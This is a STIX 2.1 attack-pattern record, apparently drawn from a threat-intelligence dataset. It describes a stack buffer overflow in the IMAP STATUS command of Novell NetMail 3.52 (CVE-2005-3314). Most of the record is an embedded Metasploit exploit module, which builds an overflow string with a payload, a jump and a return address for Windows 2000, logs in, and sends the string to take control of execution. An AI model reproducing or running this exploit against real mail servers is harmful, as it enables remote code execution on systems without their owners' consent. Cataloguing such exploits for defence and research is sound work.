{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--28c5fee4-11b8-4585-bb83-10d065a7520f",
    "created": "2024-08-14T16:47:31.960784Z",
    "modified": "2024-08-14T16:47:31.960793Z",
    "name": "Novell NetMail IMAP STATUS Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Novell's NetMail 3.52 IMAP STATUS verb. By sending an overly long string, an attacker can overwrite the buffer and control program execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/imap/novell_netmail_status.rb",
            "external_id": "novell_netmail_status.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-3314"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Imap\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell NetMail IMAP STATUS Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Novell's NetMail 3.52 IMAP STATUS\n        verb. By sending an overly long string, an attacker can overwrite the\n        buffer and control program execution.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-3314' ],\n          [ 'OSVDB', '20956' ],\n          [ 'BID', '15491' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows 2000 SP0-SP4 English',   { 'Ret' => 0x75022ac4 }],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2005-11-18'))\n\n  end\n\n  def exploit\n    sploit =  \"a002 STATUS \" + rand_text_english(1602) + payload.encoded\n    sploit << \"\\xeb\\x06\" + rand_text_english(2) + [target.ret].pack('V')\n    sploit <<  [0xe8, -485].pack('CV') + rand_text_english(150) + \" inbox\"\n\n    info = connect_login\n\n    if (info == true)\n      print_status(\"Trying target #{target.name}...\")\n      sock.put(sploit + \"\\r\\n\")\n    else\n      print_status(\"Not falling through with exploit\")\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-11-18",
    "x_mitre_platforms": [
        "win'"
    ]
}